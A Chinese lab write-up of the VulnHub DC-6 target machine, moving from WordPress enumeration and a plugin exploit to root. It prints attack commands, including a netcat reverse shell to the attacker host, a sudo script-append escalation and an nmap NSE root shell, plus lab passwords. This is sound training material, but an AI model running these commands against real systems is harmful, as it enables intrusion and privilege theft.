---
cover: /images/VulnHub.jpg
title: VulnHub DC-6 靶机渗透测试笔记
categories:
  - vulnhub-DC
tags:
  - 靶机渗透
  - VulnHub
  - vulnhub-DC
  - WordPress
  - 提权
abbrlink: 7ce08dfd
date: 2026-03-15 12:00:00# VulnHub DC-6 靶机渗透测试笔记

> **靶机信息**
> - 靶机名称：DC-6
> - 靶机来源：VulnHub
> - 目标：获取 root 权限，找到最终 flag
> - 难度：⭐⭐⭐☆☆（中等）
> - 涉及技术：信息收集、WordPress 插件漏洞、命令执行、SSH登录、sudo 提权、nmap 脚本提权

---

## 一、信息收集

### 1.1 主机发现

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image1.png)

目标 IP：`192.168.168.169`

### 1.2 端口与服务扫描

```bash
nmap -A -p- 192.168.168.169
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image2.png)

### 1.3 配置域名解析

访问 `192.168.168.169` 时自动跳转到了域名，导致打不开：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image3.png)

需要修改 hosts 文件配置域名解析。

**Windows 修改 hosts：**
```
C:\Windows\System32\drivers\etc\hosts
添加：192.168.168.169 wordy
```

**Kali 修改 hosts：**
```bash
echo "192.168.168.169 wordy" >> /etc/hosts
```

---

## 二、WordPress 信息收集

CMS 是 WordPress：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image4.png)

> 提示这个漏洞肯定和插件有关。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image5.png)

### 2.1 WPScan 扫描

```bash
wpscan --url http://wordy/
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image6.png)

```
http://wordy/wp-content/uploads/  没用
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image7.png)

### 2.2 目录扫描

```bash
dirsearch -u http://wordy
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image8.png)

找到后台登录地址：`http://wordy/wp-login.php`

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image9.png)

### 2.3 枚举用户名

```bash
wpscan --url http://wordy/ -e u
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image10.png)

创建用户名字典：

```bash
echo -e "admin\njens\ngraham\nmark\nsarah" > users.txt
```

---

## 三、密码爆破

尝试用 cewl 生成专属字典爆破：

```bash
cewl -w passwords.txt http://wordy/
wpscan --url http://wordy/ -U users.txt -P passwords.txt
```

但是没成功，换个字典。

> 看了下别人的 wp，mark 的密码是 `helpdesk01`，在 rockyou.txt 字典的七百多万行，额，太久了，直接登录吧。

登录成功：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image11.png)

---

## 四、插件漏洞利用

### 4.1 扫描插件漏洞

```bash
wpscan --url http://wordy/ -e ap --plugins-detection aggressive
```

**WPScan 插件扫描深度对比：**

| 指令 | 扫描深度 | 效果 |
|------|----------|------|
| wpscan --url http://wordy/ | 被动（Passive） | 只看 HTML 源码，只能发现 2-3 个最明显的插件 |
| wpscan --url ... -e vp | 仅漏洞（Vulnerable） | 只查找已知有漏洞的插件 |
| wpscan --url ... -e ap | 全部（All） | 扫描几百个常用插件的路径 |
| ... --plugins-detection aggressive | 激进（Aggressive） | 暴力猜测数千个插件路径 |

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image12.png)

### 4.2 搜索插件漏洞 exp

```bash
searchsploit plainview activity
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image13.png)

快捷复制 exp 文件：

```bash
searchsploit -m 45274
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image14.png)

### 4.3 利用漏洞

```bash
python -m http.server 5566
# 浏览器访问 http://192.168.168.128:5566/45274.html
```

失败了换成下面那个运行 python 文件：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image15.png)

成功取得 Web 权限，查看当前权限：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image16.png)

---

## 五、反弹 Shell

```bash
# 靶机执行
nc 192.168.168.128 5566 -e /bin/sh

# Kali 监听
nc -lvnp 5566
```

升级为交互式终端：

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image17.png)

查看系统用户：

```bash
cat /etc/passwd
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image18.png)

---

## 六、横向移动

### 6.1 找到 graham 的密码

在 mark 的目录下找到 graham 的密码：`GSo7isUM1D4`

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image19.png)

### 6.2 SSH 登录

因为之前的链接总是断，换成 SSH：

```bash
ssh graham@192.168.168.169
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image20.png)

---

## 七、提权

### 7.1 发现 backups.sh

在 jens 目录下找到一个 sh 文件：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image21.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image22.png)

查看 sudo 权限：

```bash
sudo -l
ls -l backups.sh
```

graham 没权限运行：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image23.png)

jens 可以无密码运行：

```
(jens) NOPASSWD: /home/jens/backups.sh
```

> **这行的意思是：** 系统允许用户 graham 使用 sudo 命令，伪装成 jens 用户来执行这个指定的脚本，而且不需要输入密码。

但是执行完了后还是 graham 用户，因为 jens 权限没留下，而 graham 又有写入权限，那么写入 sh，以 jens 用户执行时就会弹出 jens 的权限：

```bash
echo "/bin/bash" >> backups.sh
sudo -u jens ./backups.sh
sudo -l
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image24.png)

### 7.2 nmap 脚本提权

查看 GTFOBins：`https://gtfobins.org/gtfobins/nmap/`

> 不过这网站上记录的是老版本的，用不了，需要换种方式。

使用 nmap 的 `--script` 参数执行自定义脚本：

```bash
echo 'os.execute("/bin/sh")' > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image25.png)

出了点问题，不过很好解决：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image26.png)

> 虽然不显示，但仍然有效（复制粘贴就行），或者用 `python -c 'import pty;pty.spawn("/bin/bash")'` 也可以，也有可能是我的 xshell 的原因。

### 7.3 获取 flag

成功提权到 root，取得 flag：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-6_image27.png)

---

## 八、渗透流程总结

```
信息收集（nmap）
    ↓
发现 WordPress → 修改 hosts 配置域名解析
    ↓
WPScan 枚举用户 → 密码爆破 → mark/helpdesk01 登录后台
    ↓
扫描插件漏洞（plainview activity）→ searchsploit 找到 exp
    ↓
利用插件漏洞 → 获取 www-data shell
    ↓
mark 目录发现 graham 密码 → SSH 登录
    ↓
sudo 伪装 jens 执行 backups.sh → 获取 jens 权限
    ↓
sudo nmap --script 提权 → root → flag ✅
```

---

## 九、涉及工具汇总

| 工具 | 用途 |
|------|------|
| nmap | 端口扫描、服务识别 |
| WPScan | WordPress 专项扫描 |
| dirsearch | Web 目录扫描 |
| cewl | 网站内容生成字典 |
| searchsploit | 本地漏洞库搜索 |
| nc | 反弹 Shell |
| SSH | 稳定连接 |
| GTFOBins | sudo/SUID 提权查询 |

---

> 本文为 VulnHub DC-6 靶机学习笔记，所有操作均在本地搭建的靶场环境中完成，仅用于学习交流。
